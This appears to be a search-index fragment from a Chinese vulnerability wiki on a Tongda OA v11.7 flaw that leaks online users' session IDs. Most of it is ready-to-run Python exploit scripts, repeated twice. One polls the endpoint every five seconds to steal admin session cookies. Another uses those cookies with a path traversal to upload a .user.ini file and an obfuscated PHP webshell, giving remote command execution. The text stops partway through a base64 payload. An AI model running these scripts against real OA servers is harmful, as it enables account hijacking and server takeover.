'+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA 11.7 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"RELOGIN\" in response . text and response . status_code == 200 : print ( \" \\033 [31m[x] \u76ee\u6807\u7528\u6237\u4e3a\u4e0b\u7ebf\u72b6\u6001 --- {} \\033 [0m\" . format ( time . asctime ( time . localtime ( time . time ())))) elif response . status_code == 200 and response . text == \"\" : PHPSESSION = re . findall ( r 'PHPSESSID=(.*?);' , str ( response . headers )) print ( \" \\033 [32m[o] \u7528\u6237\u4e0a\u7ebf PHPSESSION: {} --- {} \\033 [0m\" . format ( PHPSESSION [ 0 ] , time . asctime ( time . localtime ( time . time ())))) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u76ee\u6807\u53ef\u80fd\u4e0d\u5b58\u5728\u6f0f\u6d1e\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) while True : POC_1 ( target_url ) time . sleep ( 5 ) [!NOTE] \u4e8e 2021-3-11 \u6dfb\u52a0\u8fdb\u4e00\u6b65\u5229\u7528POC \u914d\u5408 < v11.8 \u7684 \u547d\u4ee4\u6267\u884c \u5f53\u76d1\u63a7\u5230\u7528\u6237\u4e0a\u7ebf\u63a7\u5236\u670d\u52a1\u5668 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA 11.7 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_0 ( target_url ): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"RELOGIN\" in response . text and response . status_code == 200 : print ( \" \\033 [31m[x] \u76ee\u6807\u7528\u6237\u4e3a\u4e0b\u7ebf\u72b6\u6001 --- {} \\033 [0m\" . format ( time . asctime ( time . localtime ( time . time ())))) elif response . status_code == 200 and response . text == \"\" : Cookie = re . findall ( r 'PHPSESSID=(.*?);' , str ( response . headers )) print ( \" \\033 [32m[o] \u7528\u6237\u4e0a\u7ebf PHPSESSION: {} --- {} \\033 [0m\" . format ( Cookie [ 0 ] , time . asctime ( time . localtime ( time . time ())))) Cookie = \"PHPSESSID= {} ;USER_NAME_COOKIE=admin; OA_USER_ID=admin\" . format ( Cookie [ 0 ]) POC_1 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u76ee\u6807\u53ef\u80fd\u4e0d\u5b58\u5728\u6f0f\u6d1e\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u4e0a\u4f20\u8681\u5251\u6728\u9a6c \u5bc6\u7801\u4e3a: PeiQi \\n [o] webshell\u8def\u5f84: {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) while True : POC_0 ( target_url ) time . sleep ( 5 )","title":"\u901a\u8fbeOA v11.7 \u5728\u7ebf\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u901a\u8fbeoa-v117-\u5728\u7ebf\u7528\u6237\u767b\u5f55\u6f0f\u6d1e","text":"","title":"\u901a\u8fbeOA v11.7 \u5728\u7ebf\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.7 \u4e2d\u5b58\u5728\u67d0\u63a5\u53e3\u67e5\u8be2\u5728\u7ebf\u7528\u6237\uff0c\u5f53\u7528\u6237\u5728\u7ebf\u65f6\u4f1a\u8fd4\u56de PHPSESSION\u4f7f\u5176\u53ef\u767b\u5f55\u540e\u53f0\u7cfb\u7edf","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA < v11.7","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u901a\u8fbeOA v11.7\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u540e\u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u6709\u5173\u6587\u4ef6 MYOA\\webroot\\mobile\\auth_mobi.php <?php function relogin () { echo _ ( 'RELOGIN' ); exit ; } ob_start (); include_once 'inc/session.php' ; include_once 'inc/conn.php' ; include_once 'inc/utility.php' ; if ( $isAvatar == '1' && $uid != '' && $P_VER != '' ) { $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\'' ; $cursor = exequery ( TD :: conn (), $sql ); if ( $row = mysql_fetch_array ( $cursor )) { $P = $row [ 'SID' ]; } } if ( $P == '' ) { $P = $_COOKIE [ 'PHPSESSID' ]; if ( $P == '' ) { relogin (); exit ; } } if ( preg_match ( '/[^a-z0-9;]+/i' , $P )) { echo _ ( '\u975e\u6cd5\u53c2\u6570' ); exit ; } if ( strpos ( $P , ';' ) !== false ) { $MY_ARRAY = explode ( ';' , $P ); $P = trim ( $MY_ARRAY [ 1 ]); } session_id ( $P ); session_start (); session_write_close (); if ( $_SESSION [ 'LOGIN_USER_ID' ] == '' || $_SESSION [ 'LOGIN_UID' ] == '' ) { relogin (); } \u5728\u6267\u884c\u7684 SQL\u8bed\u53e5\u4e2d $ sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . ' \\ ' and CLIENT = \\'' . $P_VER . ' \\ '' ; \u7b80\u5355\u9605\u8bfbPHP\u6e90\u7801\u53ef\u4ee5\u77e5\u9053 \u6b64SQL\u8bed\u53e5\u4f1a\u67e5\u8be2\u7528\u6237\u662f\u5426\u5728\u7ebf\uff0c\u5982\u5728\u7ebf\u8fd4\u56de\u6b64\u7528\u6237 Session ID \u5c06\u8fd4\u56de\u7684 Set-Cookie \u4e2d\u7684Cookie\u53c2\u6570\u503c\u4f7f\u7528\u4e8e\u767b\u5f55Cookie \u8bbf\u95ee\u76ee\u6807\u540e\u53f0 http://xxx.xxx.xxx.xxx/general/ \u5f53\u76ee\u6807\u79bb\u7ebf\u65f6\u5219\u8bbf\u95ee\u6f0f\u6d1e\u9875\u9762\u5219\u4f1a\u51fa\u73b0\u5982\u4e0b\u56fe [!NOTE] \u901a\u8fc7\u6b64\u601d\u8def\u53ef\u4ee5\u6301\u7eed\u53d1\u5305\u76d1\u63a7\u6b64\u9875\u9762\u6765\u83b7\u53d6\u5728\u7ebf\u7528\u6237\u7684Cookie","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] 5\u79d2\u4e00\u6b21\u6d4b\u8bd5\u7528\u6237\u662f\u5426\u5728\u7ebf import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA 11.7 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"RELOGIN\" in response . text and response . status_code == 200 : print ( \" \\033 [31m[x] \u76ee\u6807\u7528\u6237\u4e3a\u4e0b\u7ebf\u72b6\u6001 --- {} \\033 [0m\" . format ( time . asctime ( time . localtime ( time . time ())))) elif response . status_code == 200 and response . text == \"\" : PHPSESSION = re . findall ( r 'PHPSESSID=(.*?);' , str ( response . headers )) print ( \" \\033 [32m[o] \u7528\u6237\u4e0a\u7ebf PHPSESSION: {} --- {} \\033 [0m\" . format ( PHPSESSION [ 0 ] , time . asctime ( time . localtime ( time . time ())))) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u76ee\u6807\u53ef\u80fd\u4e0d\u5b58\u5728\u6f0f\u6d1e\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) while True : POC_1 ( target_url ) time . sleep ( 5 ) [!NOTE] \u4e8e 2021-3-11 \u6dfb\u52a0\u8fdb\u4e00\u6b65\u5229\u7528POC \u914d\u5408 < v11.8 \u7684 \u547d\u4ee4\u6267\u884c \u5f53\u76d1\u63a7\u5230\u7528\u6237\u4e0a\u7ebf\u63a7\u5236\u670d\u52a1\u5668 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA 11.7 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_0 ( target_url ): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"RELOGIN\" in response . text and response . status_code == 200 : print ( \" \\033 [31m[x] \u76ee\u6807\u7528\u6237\u4e3a\u4e0b\u7ebf\u72b6\u6001 --- {} \\033 [0m\" . format ( time . asctime ( time . localtime ( time . time ())))) elif response . status_code == 200 and response . text == \"\" : Cookie = re . findall ( r 'PHPSESSID=(.*?);' , str ( response . headers )) print ( \" \\033 [32m[o] \u7528\u6237\u4e0a\u7ebf PHPSESSION: {} --- {} \\033 [0m\" . format ( Cookie [ 0 ] , time . asctime ( time . localtime ( time . time ())))) Cookie = \"PHPSESSID= {} ;USER_NAME_COOKIE=admin; OA_USER_ID=admin\" . format ( Cookie [ 0 ]) POC_1 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u76ee\u6807\u53ef\u80fd\u4e0d\u5b58\u5728\u6f0f\u6d1e\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7